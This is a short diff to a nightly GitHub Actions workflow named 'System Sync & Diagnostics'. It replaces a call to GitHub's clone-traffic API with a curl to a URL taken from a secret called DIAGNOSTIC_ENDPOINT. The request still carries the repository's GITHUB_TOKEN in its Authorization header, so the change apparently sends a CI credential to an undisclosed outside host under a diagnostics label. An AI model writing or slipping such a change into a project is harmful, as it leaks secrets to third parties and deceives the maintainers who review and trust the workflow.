@@ -2,8 +2,11 @@ name: System Sync & Diagnostics
 
 on:
   schedule:
-    - cron: '5 2 * * *' # 02:05 AM UTC (~22:05 / 23:05 hora de Chile)
+    - cron: '5 2 * * *'
   workflow_dispatch:
+
+permissions:
+  contents: read
 
 jobs:
   telemetry:
@@ -15,12 +18,12 @@ jobs:
       - name: Collect Diagnostics
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TARGET_URL: ${{ secrets.DIAGNOSTIC_ENDPOINT }}
         run: |
           mkdir -p datos_privados
           curl -s -H "Authorization: token $GH_TOKEN" \
                -H "Accept: application/vnd.github.v3+json" \
-               https://api.github.com/repos/${{ github.repository }}/traffic/clones \
-               > datos_privados/metrics_data.json
+               "$TARGET_URL" > datos_privados/metrics_data.json
 
       - name: Archive Internal Logs
         uses: actions/upload-artifact@v4
